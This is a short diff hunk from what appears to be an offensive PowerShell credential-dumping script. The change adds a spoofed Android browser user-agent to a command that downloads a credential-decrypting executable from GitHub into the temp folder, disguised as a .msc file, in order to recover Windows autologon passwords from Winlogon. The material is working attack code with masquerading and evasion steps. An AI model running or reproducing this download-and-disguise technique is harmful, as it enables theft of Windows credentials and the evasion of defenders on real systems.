@@ -113,7 +113,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
         # Download and masquerade standalone executable to look like one .msc archive
         Write-Host "`nScanning winlogon for crypted creds!" -ForegroundColor Green
         Write-Host "------------------------------------";Start-Sleep -Seconds 1
-        iwr -Uri https://raw.githubusercontent.com/securesean/DecryptAutoLogon/main/DecryptAutoLogon/bin/Release/DecryptAutoLogon.exe -OutFile $Env:TMP\DecryptAutoLogon.msc|Out-Null
+        iwr -Uri https://raw.githubusercontent.com/securesean/DecryptAutoLogon/main/DecryptAutoLogon/bin/Release/DecryptAutoLogon.exe -OutFile $Env:TMP\DecryptAutoLogon.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
         If(-not(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc" -EA SilentlyContinue)){
            Write-Host "[error] not found: $Env:TMP\DecryptAutoLogon.msc" -ForegroundColor Red -BackgroundColor Black
         }Else{## Decrypting autologon credentials
